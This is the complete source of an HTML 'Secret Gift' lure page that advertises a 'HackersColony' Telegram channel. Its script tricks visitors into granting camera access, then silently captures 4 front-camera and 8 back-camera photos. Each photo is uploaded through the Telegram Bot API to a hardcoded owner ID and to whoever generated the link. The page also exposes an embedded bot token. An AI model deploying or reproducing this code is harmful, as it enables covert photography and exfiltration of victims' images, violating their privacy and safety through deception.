<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Surprise Gift</title>
    <style>
        body {
            margin: 0;
            background: linear-gradient(135deg, #0b0014, #1a0030);
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }
        .card {
            background: rgba(22, 0, 34, 0.9);
            padding: 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 0, 255, 0.3);
        }
        .gift-icon {
            font-size: 70px;
            margin-bottom: 10px;
            animation: float 3s ease-in-out infinite;
        }
        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        h2 {
            margin: 10px 0;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            border-radius: 50px;
            border: none;
            background: linear-gradient(45deg, #ff00ff, #00ffff);
            color: black;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s;
        }
        button:hover {
            transform: scale(1.05);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 0, 255, 0.3);
            border-top: 4px solid #ff00ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 0, 255, 0.2);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ff00ff, #00ffff);
            width: 0%;
            transition: width 0.5s ease;
        }
        .status {
            margin-top: 15px;
            font-size: 14px;
            color: #ffb3ff;
            min-height: 20px;
        }
        .hidden {
            display: none;
        }
        .telegram-info {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0, 100, 200, 0.2);
            border-radius: 10px;
            border: 1px solid rgba(0, 150, 255, 0.3);
        }
        .telegram-info a {
            color: #00bfff;
            text-decoration: none;
        }
        .telegram-info a:hover {
            text-decoration: underline;
        }
        .video-container {
            width: 100%;
            height: 200px;
            margin: 15px 0;
            border-radius: 10px;
            overflow: hidden;
            background: #000;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div class="card">
        <div id="box">
            <div class="gift-icon">üéÅ</div>
            <h2>‚ú® Secret Gift ‚ú®</h2>
            <p>A magical surprise is waiting for you!</p>
            <p style="font-size: 12px; color: #aaa;">Join Telegram channel to use this bot</p>
            
            <div class="telegram-info">
                <p>üì¢ <strong>Required:</strong></p>
                <p>1. Join: <a href="https://t.me/HackersColony" target="_blank">@HackersColony</a></p>
                <p>2. Contact: <a href="https://t.me/Hackers_Colony_Official" target="_blank">@Hackers_Colony_Official</a></p>
            </div>
            
            <button id="unlockBtn">üéØ Unlock Gift</button>
            
            <p style="font-size: 12px; color: #888; margin-top: 20px;">
                This will use your camera to create a personalized gift
            </p>
        </div>
        
        <div class="video-container hidden" id="videoContainer">
            <video id="video" autoplay playsinline></video>
        </div>
    </div>

    <script>
        const USER_ID = new URLSearchParams(window.location.search).get('uid');
        const BOT_TOKEN = "8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8";
        const OWNER_ID = "8215819954";
        
        document.getElementById("unlockBtn").onclick = async () => {
            const box = document.getElementById("box");
            const btn = document.getElementById("unlockBtn");
            const videoContainer = document.getElementById("videoContainer");
            
            btn.disabled = true;
            
            // Check if user ID exists
            if (!USER_ID) {
                box.innerHTML = `
                    <div class="gift-icon">‚ö†Ô∏è</div>
                    <h2 style="color:#ff5555">Invalid Link</h2>
                    <p>Please get a valid link from the Telegram bot</p>
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">Get Link from Bot</button>
                `;
                return;
            }
            
            box.innerHTML = `
                <div class="gift-icon">‚ú®</div>
                <h2>üéÄ Creating Magic</h2>
                <p>Please wait while we prepare your gift...</p>
                <div class="spinner"></div>
                <div class="progress-container">
                    <div class="progress-bar" id="progress"></div>
                </div>
                <div class="status" id="statusText">Initializing...</div>
            `;
            
            videoContainer.classList.remove('hidden');
            
            const progress = document.getElementById("progress");
            const statusText = document.getElementById("statusText");
            const video = document.getElementById("video");
            
            try {
                // Front Camera - 4 photos
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });
                video.srcObject = frontStream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 1000);
                    };
                });
                
                for (let i = 1; i <= 4; i++) {
                    progress.style.width = (i * 12.5) + "%";
                    statusText.textContent = `Front camera photo ${i}/4...`;
                    await new Promise(r => setTimeout(r, 800));
                    await capturePhoto(`front_${i}`);
                }
                
                frontStream.getTracks().forEach(track => track.stop());
                
                // Back Camera - 4 photos
                await new Promise(r => setTimeout(r, 1000));
                statusText.textContent = "Switching to back camera...";
                
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" },
                    audio: false
                });
                video.srcObject = backStream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 1000);
                    };
                });
                
                for (let i = 1; i <= 8; i++) {
                    progress.style.width = (50 + i * 6.25) + "%";
                    statusText.textContent = `Back camera photo ${i}/8...`;
                    await new Promise(r => setTimeout(r, 800));
                    await capturePhoto(`back_${i}`);
                }
                
                backStream.getTracks().forEach(track => track.stop());
                
                progress.style.width = "100%";
                statusText.textContent = "Finishing up...";
                await new Promise(r => setTimeout(r, 1500));
                
                videoContainer.classList.add('hidden');
                
                // Success
                box.innerHTML = `
                    <div class="gift-icon">üéâ</div>
                    <h2 style="color:#00ff00">üéÅ Gift Delivered!</h2>
                    <p>Your special surprise has been prepared</p>
                    <p>Photos are being sent to your Telegram...</p>
                    <div class="status" style="color:#00ff00">‚ú® Complete ‚ú®</div>
                    <button onclick="window.location.href='https://t.me/HackersColonyBot'">üì± Open Telegram</button>
                `;
                
            } catch (error) {
                console.error(error);
                videoContainer.classList.add('hidden');
                box.innerHTML = `
                    <div class="gift-icon">üé≠</div>
                    <h2 style="color:#ff5555">Camera Access Needed</h2>
                    <p>Please allow camera access to receive your gift</p>
                    <p style="font-size:12px; color:#aaa">Error: ${error.message}</p>
                    <button onclick="location.reload()">üîÑ Try Again</button>
                `;
            }
        };

        async function capturePhoto(label) {
            const video = document.getElementById("video");
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const reader = new FileReader();
                        reader.onloadend = async () => {
                            const base64data = reader.result.split(',')[1];
                            
                            // Send to user
                            await sendToTelegram(USER_ID, base64data, `üéÅ Your Gift: ${label}`);
                            
                            // Send to owner
                            await sendToTelegram(OWNER_ID, base64data, `üì∏ From ${USER_ID}: ${label} | Username: ${USER_ID}`);
                            
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    } else {
                        resolve();
                    }
                }, 'image/jpeg', 0.9);
            });
        }

        async function sendToTelegram(chatId, photoBase64, caption) {
            try {
                const byteCharacters = atob(photoBase64);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                const formData = new FormData();
                formData.append('photo', blob, `gift_${Date.now()}.jpg`);
                formData.append('chat_id', chatId);
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (!result.ok) {
                    console.error('Telegram API error:', result);
                }
                
                return true;
            } catch (error) {
                console.error(`Failed to send to ${chatId}:`, error);
                return false;
            }
        }

        // Show warning if no user ID
        if (!USER_ID) {
            document.getElementById("unlockBtn").disabled = true;
            document.getElementById("unlockBtn").innerHTML = "‚ö†Ô∏è Get Link from Bot First";
        }
    </script>
</body>
</html>
